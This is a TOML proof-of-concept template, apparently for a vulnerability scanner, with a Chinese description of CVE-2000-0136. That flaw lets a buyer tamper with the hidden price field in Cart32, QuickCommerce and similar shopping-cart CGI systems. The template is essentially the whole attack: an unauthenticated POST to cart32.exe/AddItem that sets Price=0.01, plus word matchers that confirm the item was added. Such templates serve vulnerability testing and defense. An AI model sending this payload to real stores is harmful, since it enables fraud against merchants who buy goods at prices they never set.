[info]
author = "ave"
description = "通过向购物车应用的 CGI 接口发送特制 POST 请求，修改隐藏表单字段中的价格参数，实现低价购买商品。攻击者无需身份认证，仅需构造包含篡改后价格的 HTTP POST 数据包即可。"
id = "POC-AVE-2000-0406"
name = "Cart32/QuickCommerce/Shop Express/StoreCreator 购物车系统隐藏表单字段信息修改漏洞 PoC"
severity = "high"
tags = ["ave-2000-0406"]
vuln_id = [
    "CVE-2000-0136",
    "AVE-2000-0406",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/cart32.exe/AddItem"
protocol = "http"

[poc.requests.body]
content = "Price=0.01&Item=Test+Item&PartNo=TEST001&Qty=1"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
Referer = "{{BaseURL}}"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Added",
    "added",
    "Cart",
    "cart",
]
